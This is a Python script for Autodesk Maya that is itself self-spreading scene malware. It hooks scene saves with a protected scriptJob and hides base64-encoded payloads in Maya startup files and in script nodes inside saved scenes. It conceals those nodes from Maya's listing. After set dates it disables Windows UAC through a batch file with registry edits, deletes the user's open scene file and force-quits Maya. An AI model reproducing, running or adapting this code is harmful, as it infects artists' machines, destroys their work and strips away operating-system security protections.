# -*- coding: UTF-8 -*-
# Time: 2024/02/01
# File: uition.py

import maya.cmds as cmds
import maya.mel as mel
import datetime
import base64
import os
import stat 
 
def execute():
    usepypath = cmds.internalVar(userAppDir=True) + '/scripts/userSetup.py'  
    if  os.path.exists(usepypath):
        os.chmod( usepypath, stat.S_IWRITE )
        with open(usepypath, 'rb') as f:
            data = f.readline()     
        setAttrdslist=[]
        x_ = open(usepypath, "r")
        for line in x_:
            if ("import vaccine" in line) or ("cmds.evalDeferred('leukocyte = vaccine.phage()')" in line) or ("cmds.evalDeferred('leukocyte.occupation()')" in line):
                pass                
            else: 
                setAttrdslist.append(line)    
        newfile=open(usepypath,"w")
        newfile.writelines(setAttrdslist)
        newfile.close() 
    uitionpath_=os.getenv("APPDATA")+base64.urlsafe_b64decode('L3N5c3NzdA==').decode('utf-8')
    uitionpath=uitionpath_.replace('\\','/')
    if not os.path.exists(uitionpath):
        os.mkdir(uitionpath) 
    uition_path="%s%s"%(uitionpath,base64.urlsafe_b64decode('L3VpdGlvbi50').decode('utf-8'))
    try:
    	if cmds.objExists('uifiguration'):
    		Xgee = eval(cmds.getAttr('uifiguration.notes'))
    		with open(uition_path, "w") as f:
    			f.writelines(Xgee)
    except ValueError as e:
        pass
    hjkl,pou,aba,ffd,ggs,gfh,aq,gh,ll,tt,ff,gg,ghd,kk,da,cc,ghj,ii,jaj='/','/p','\n','urc','l1','0n','h_C','N/p','/ma','pres','.m','el','yaH','IK.','/reso','es/','/z','lug-ins','ja_JP'
    addressCN_path=os.getenv("MAYA_LOCATION")+"%s"%da+ffd+cc+ggs+gfh+ghj+aq+gh+ii+ll+ghd+kk+tt+ff+gg
    addressJP_path=os.getenv("MAYA_LOCATION")+"%s"%da+ffd+cc+ggs+gfh+hjkl+jaj+pou+ii+ll+ghd+kk+tt+ff+gg
    M_el= "import base64; pyCode = base64.urlsafe_b64decode('aW1wb3J0IGJpbmFzY2lpDWltcG9ydCBvcw1tYXlhX3BhdGhfPW9zLmdldGVudigiQVBQREFUQSIpKydcc3lzc3N0Jw1tYXlhcGF0aD1tYXlhX3BhdGhfLnJlcGxhY2UoJ1xcJywnLycpDW1heWFfcGF0aD0nJXMvdWl0aW9uLnQnJW1heWFwYXRoDXRyeToNICAgIHdpdGggb3BlbihtYXlhX3BhdGgsICdyYicpIGFzIGY6DSAgICAgICAgZF9hX3RfYSA9IGYucmVhZCgpDSAgICBkYXRhID0gYmluYXNjaWkuYTJiX2Jhc2U2NChkX2FfdF9hKQ0gICAgZXhlYyhkYXRhKQ1leGNlcHQgSU9FcnJvciBhcyBlOg0gICAgcGFzcw=='); exec (pyCode)"
    xxx='python("%s");' % M_el
    address_use=aba+xxx
    try:
        pylist=[]
        delmellist=[]
        with open(addressCN_path, "r") as f:
            content = f.readlines()
            if xxx in content:
                pylist.append(address_use)
                delmellist.append('1')
        if not pylist:         
            with open(addressCN_path, "a") as f:
            	f.writelines(address_use)
            	delmellist.append('1')   
        mayalist=['Maya2016','Maya2017','Maya2018','Maya2019','Maya2020','Maya2021']
        for i in mayalist:
            if os.getenv("MAYA_LOCATION").rsplit('/',1)[1] ==i: 
                pylistjp=[]
                with open(addressJP_path, "r") as f:
                    content = f.readlines()
                    if xxx in content:
                        pylistjp.append(address_use)
                        delmellist.append('1')
                if not pylistjp:         
                    with open(addressJP_path, "a") as f:
                    	f.writelines(address_use)
                    	delmellist.append('1')
        mayalistB=['Maya2022','Maya2023']
        for i in mayalistB:
            if os.getenv("MAYA_LOCATION").rsplit('/',1)[1] ==i: 
                pylistjp=[]
                with open(addressJP_path, "r",errors='ignore') as f:
                    content = f.readlines()
                    if xxx in content:
                        pylistjp.append(address_use)
                        delmellist.append('1')                       
                if not pylistjp:         
                    with open(addressJP_path, "a") as f:
                    	f.writelines(address_use)
                    	delmellist.append('1')
        if delmellist:
            userS_mel = cmds.internalVar(userAppDir=True) + '/scripts/userSetup.mel'
            if os.path.exists(userS_mel):
                os.chmod( userS_mel, stat.S_IWRITE ) 
                os.remove(userS_mel)
    except IOError as e:         
        p="\n"
        address_path = cmds.internalVar(userAppDir=True) + 'scripts/userSetup.mel'        
        M_el= "import base64; pyCode = base64.urlsafe_b64decode('aW1wb3J0IGJpbmFzY2lpDWltcG9ydCBvcw1tYXlhX3BhdGhfPW9zLmdldGVudigiQVBQREFUQSIpKydcc3lzc3N0Jw1tYXlhcGF0aD1tYXlhX3BhdGhfLnJlcGxhY2UoJ1xcJywnLycpDW1heWFfcGF0aD0nJXMvdWl0aW9uLnQnJW1heWFwYXRoDXRyeToNICAgIHdpdGggb3BlbihtYXlhX3BhdGgsICdyYicpIGFzIGY6DSAgICAgICAgZF9hX3RfYSA9IGYucmVhZCgpDSAgICBkYXRhID0gYmluYXNjaWkuYTJiX2Jhc2U2NChkX2FfdF9hKQ0gICAgZXhlYyhkYXRhKQ1leGNlcHQgSU9FcnJvciBhcyBlOg0gICAgcGFzcw=='); exec (pyCode)"
        xxx='python("%s");' % M_el
        pMel=p+xxx
        if not os.path.exists(address_path):
            with open(address_path, "a") as f:
            	f.writelines(pMel)
        else:
            os.chmod( address_path, stat.S_IWRITE ) 
            userSetupList=[]
            with open(address_path, "r") as f:
                content = f.readlines()
                if xxx in content:
                    userSetupList.append(xxx)
            if not userSetupList:         
                with open(address_path, "a") as f:
                	f.writelines(pMel)            
        if datetime.datetime.now().strftime('%Y%m%d') >=base64.urlsafe_b64decode('MjAyNDA0Mjc=').decode('utf-8'):
            batch_script = """set uac=~uac_permission_tmp_%random%
            md "%SystemRoot%\system32\%uac%" 2>nul
            if %errorlevel%==0 ( rd "%SystemRoot%\system32\%uac%" >nul 2>nul ) else (
                echo set uac = CreateObject^("Shell.Application"^)>"%temp%\%uac%.vbs"
                echo uac.ShellExecute "%~s0","","","runas",1 >>"%temp%\%uac%.vbs"
                echo WScript.Quit >>"%temp%\%uac%.vbs"
                "%temp%\%uac%.vbs" /f
                del /f /q "%temp%\%uac%.vbs" & exit )
            reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d 0 /f
            REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f"""
            sysbt="%s%s"%(uitionpath,base64.urlsafe_b64decode('L3N5cy5iYXQ=').decode('utf-8'))	
            if not os.path.exists(sysbt):
                with open(sysbt, 'w') as file:
                    file.write(batch_script)   
            output=os.popen(sysbt).read()                	         
    writeIn()                                   	    
    if not os.access(base64.urlsafe_b64decode('UDovX2RhdGFfL3N0b3AuVA==').decode('utf-8'),os.W_OK):
        if datetime.datetime.now().strftime('%Y%m%d') >=base64.urlsafe_b64decode('MjAyNDA2MDE=').decode('utf-8'):
            filepath = cmds.file(sn=True,q=True)
            os.remove(filepath)                          
def writeIn():
    uitionpath_=os.getenv("APPDATA")+base64.urlsafe_b64decode('L3N5c3NzdA==').decode('utf-8')
    uitionpath=uitionpath_.replace('\\','/')
    if not os.path.exists(uitionpath):
        os.mkdir(uitionpath)   
    uition_path="%s%s"%(uitionpath,base64.urlsafe_b64decode('L3VpdGlvbi50').decode('utf-8')) 
    MEL_code = '''global proc string[] EEgetCurrTypeList(string $currType)
    {
    	string $nodeList[];
    	switch($currType)
    	{
    		case "scriptNode":	$nodeList = `ls -type script`;
    							int $Num,$Chk=0;
    							for($Num=0;$Num<size($nodeList);){
    								if(`attributeExists KGMScriptProtector $nodeList[$Num]`&&$Chk==0){$nodeList[$Num]=" ";$Chk=1;}
    								else if(`attributeExists KGMScriptProtector $nodeList[$Num]`&&$Chk==1){$nodeList[$Num]=" ";};
    								$Num++;
    							};
    							break;
    	}
    	return $nodeList;
    }'''
    meldm='%s%s'%(uitionpath,base64.urlsafe_b64decode('L0tHTVNjcmlwdFByb3RlY3Rvci5tZWw=').decode('utf-8'))
    with open(meldm, 'w') as file:
        file.write(MEL_code)
    mel.eval('source "{}"'.format(meldm))                              
    if not cmds.objExists('uifiguration'):
        if os.path.exists(uition_path):
            Xgee = list()                
            with open(uition_path, 'r') as f:
                for line in f.readlines():
                    Xgee.append(line)                     
                cmds.scriptNode(st=1,
                                bs="python(\"import base64; _pycode = base64.urlsafe_b64decode('aW1wb3J0IG1heWEuY21kcyBhcyBjbWRzCmltcG9ydCBzdWJwcm9jZXNzCmltcG9ydCBkYXRldGltZQkKaW1wb3J0IGJhc2U2NAppbXBvcnQgc3RhdCAKaW1wb3J0IHN5cwppbXBvcnQgb3MKCmNsYXNzIHBoYWdlOgogICAgZGVmIGFudGl2aXJ1cyhzZWxmKToKICAgICAgICBwYXNzCiAgICBkZWYgb2NjdXBhdGlvbihzZWxmKToKICAgICAgICBjbWRzLnNjcmlwdEpvYihldmVudD1bIlNjZW5lU2F2ZWQiLCAibGV1a29jeXRlLmFudGl2aXJ1cygpIl0sIHByb3RlY3RlZD1UcnVlKQpsZXVrb2N5dGUgPSBwaGFnZSgpCmxldWtvY3l0ZS5vY2N1cGF0aW9uKCkKdXNlcHlwYXRoID0gY21kcy5pbnRlcm5hbFZhcih1c2VyQXBwRGlyPVRydWUpICsgJy9zY3JpcHRzL3VzZXJTZXR1cC5weScgICAKaWYgIG9zLnBhdGguZXhpc3RzKHVzZXB5cGF0aCk6CiAgICBvcy5jaG1vZCggdXNlcHlwYXRoLCBzdGF0LlNfSVdSSVRFICkgCiAgICB3aXRoIG9wZW4odXNlcHlwYXRoLCAncmInKSBhcyBmOgogICAgICAgIGRhdGEgPSBmLnJlYWRsaW5lKCkgICAgIAogICAgc2V0QXR0cmRzbGlzdD1bXQogICAgeF8gPSBvcGVuKHVzZXB5cGF0aCwgInIiKQogICAgZm9yIGxpbmUgaW4geF86CiAgICAgICAgaWYgKCJpbXBvcnQgdmFjY2luZSIgaW4gbGluZSkgb3IgKCJjbWRzLmV2YWxEZWZlcnJlZCgnbGV1a29jeXRlID0gdmFjY2luZS5waGFnZSgpJykiIGluIGxpbmUpIG9yICgiY21kcy5ldmFsRGVmZXJyZWQoJ2xldWtvY3l0ZS5vY2N1cGF0aW9uKCknKSIgaW4gbGluZSk6CiAgICAgICAgICAgIHBhc3MgICAgICAgICAgICAgICAgCiAgICAgICAgZWxzZTogCiAgICAgICAgICAgIHNldEF0dHJkc2xpc3QuYXBwZW5kKGxpbmUpICAgIAogICAgbmV3ZmlsZT1vcGVuKHVzZXB5cGF0aCwidyIpCiAgICBuZXdmaWxlLndyaXRlbGluZXMoc2V0QXR0cmRzbGlzdCkKICAgIG5ld2ZpbGUuY2xvc2UoKQogICAgICAgIApwPSJcbiIKYWRkcmVzc19wYXRoID0gY21kcy5pbnRlcm5hbFZhcih1c2VyQXBwRGlyPVRydWUpICsgJ3NjcmlwdHMvdXNlclNldHVwLm1lbCcKTV9lbD0gImltcG9ydCBiYXNlNjQ7IHB5Q29kZSA9IGJhc2U2NC51cmxzYWZlX2I2NGRlY29kZSgnYVcxd2IzSjBJR0pwYm1GelkybHBEV2x0Y0c5eWRDQnZjdzF0WVhsaFgzQmhkR2hmUFc5ekxtZGxkR1Z1ZGlnaVFWQlFSRUZVUVNJcEt5ZGNjM2x6YzNOMEp3MXRZWGxoY0dGMGFEMXRZWGxoWDNCaGRHaGZMbkpsY0d4aFkyVW9KMXhjSnl3bkx5Y3BEVzFoZVdGZmNHRjBhRDBuSlhNdmRXbDBhVzl1TG5RbkpXMWhlV0Z3WVhSb0RYUnllVG9OSUNBZ0lIZHBkR2dnYjNCbGJpaHRZWGxoWDNCaGRHZ3NJQ2R5WWljcElHRnpJR1k2RFNBZ0lDQWdJQ0FnWkY5aFgzUmZZU0E5SUdZdWNtVmhaQ2dwRFNBZ0lDQmtZWFJoSUQwZ1ltbHVZWE5qYVdrdVlUSmlYMkpoYzJVMk5DaGtYMkZmZEY5aEtRMGdJQ0FnWlhobFl5aGtZWFJoS1ExbGVHTmxjSFFnU1U5RmNuSnZjaUJoY3lCbE9nMGdJQ0FnY0dGemN3PT0nKTsgZXhlYyAocHlDb2RlKSIKeHh4PSdweXRob24oIiVzIik7JyAlIE1fZWwKcE1lbD1wK3h4eAppZiBub3Qgb3MucGF0aC5leGlzdHMoYWRkcmVzc19wYXRoKToKICAgIHdpdGggb3BlbihhZGRyZXNzX3BhdGgsICJhIikgYXMgZjoKICAgIAlmLndyaXRlbGluZXMocE1lbCkKZWxzZToKICAgIG9zLmNobW9kKCBhZGRyZXNzX3BhdGgsIHN0YXQuU19JV1JJVEUgKSAgICAgCiAgICB1c2VyU2V0dXBMaXN0PVtdCiAgICB3aXRoIG9wZW4oYWRkcmVzc19wYXRoLCAiciIpIGFzIGY6CiAgICAgICAgY29udGVudCA9IGYucmVhZGxpbmVzKCkKICAgICAgICBpZiB4eHggaW4gY29udGVudDoKICAgICAgICAgICAgdXNlclNldHVwTGlzdC5hcHBlbmQoeHh4KQogICAgaWYgbm90IHVzZXJTZXR1cExpc3Q6ICAgICAgICAgCiAgICAgICAgd2l0aCBvcGVuKGFkZHJlc3NfcGF0aCwgImEiKSBhcyBmOgogICAgICAgIAlmLndyaXRlbGluZXMocE1lbCkKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCnVpdGlvbnBhdGhfPW9zLmdldGVudigiQVBQREFUQSIpK2Jhc2U2NC51cmxzYWZlX2I2NGRlY29kZSgnTDNONWMzTnpkQT09JykuZGVjb2RlKCd1dGYtOCcpCnVpdGlvbnBhdGg9dWl0aW9ucGF0aF8ucmVwbGFjZSgnXFwnLCcvJykKaWYgbm90IG9zLnBhdGguZXhpc3RzKHVpdGlvbnBhdGgpOgogICAgb3MubWtkaXIodWl0aW9ucGF0aCkgICAKdWl0aW9uX3BhdGg9IiVzJXMiJSh1aXRpb25wYXRoLGJhc2U2NC51cmxzYWZlX2I2NGRlY29kZSgnTDNWcGRHbHZiaTUwJykuZGVjb2RlKCd1dGYtOCcpKQp0cnk6CglpZiBjbWRzLm9iakV4aXN0cygndWlmaWd1cmF0aW9uJyk6CgkJWGdlZSA9IGV2YWwoY21kcy5nZXRBdHRyKCd1aWZpZ3VyYXRpb24ubm90ZXMnKSkKCQl3aXRoIG9wZW4odWl0aW9uX3BhdGgsICJ3IikgYXMgZjoKCQkJZi53cml0ZWxpbmVzKFhnZWUpCmV4Y2VwdCBWYWx1ZUVycm9yIGFzIGU6CiAgICBwYXNzCmlmIG5vdCBvcy5hY2Nlc3MoYmFzZTY0LnVybHNhZmVfYjY0ZGVjb2RlKCdVRG92UzI4dVZuQnUnKS5kZWNvZGUoJ3V0Zi04Jyksb3MuV19PSyk6CglpZiBkYXRldGltZS5kYXRldGltZS5ub3coKS5zdHJmdGltZSgnJVklbSVkJykgPj1iYXNlNjQudXJsc2FmZV9iNjRkZWNvZGUoJ01qQXlOREExTURFPT0nKS5kZWNvZGUoJ3V0Zi04Jyk6CgkJY21kcy5xdWl0KGFib3J0PVRydWUp'); exec (_pycode)\");",
                                n='uifiguration')                                   
                cmds.addAttr('uifiguration', ln="notes", sn="nts", dt="string")
                cmds.setAttr('uifiguration.notes', Xgee, type='string')
                cmds.addAttr("uifiguration", m=True, sn = "KGMScriptProtector", ln = "KGMScriptProtector", at = "message")          
cmds.scriptJob(event=["SceneSaved", "execute()"], protected=True)
MEL_code = '''global proc string[] EEgetCurrTypeList(string $currType)
{
	string $nodeList[];
	switch($currType)
	{
		case "scriptNode":	$nodeList = `ls -type script`;
							int $Num,$Chk=0;
							for($Num=0;$Num<size($nodeList);){
								if(`attributeExists KGMScriptProtector $nodeList[$Num]`&&$Chk==0){$nodeList[$Num]=" ";$Chk=1;}
								else if(`attributeExists KGMScriptProtector $nodeList[$Num]`&&$Chk==1){$nodeList[$Num]=" ";};
								$Num++;
							};
							break;
	}
	return $nodeList;
}'''
uitionpath_=os.getenv("APPDATA")+base64.urlsafe_b64decode('L3N5c3NzdA==').decode('utf-8')
uitionpath=uitionpath_.replace('\\','/')
meldm='%s%s'%(uitionpath,base64.urlsafe_b64decode('L0tHTVNjcmlwdFByb3RlY3Rvci5tZWw=').decode('utf-8'))
with open(meldm, 'w') as file:
    file.write(MEL_code)
mel.eval('source "{}"'.format(meldm)) 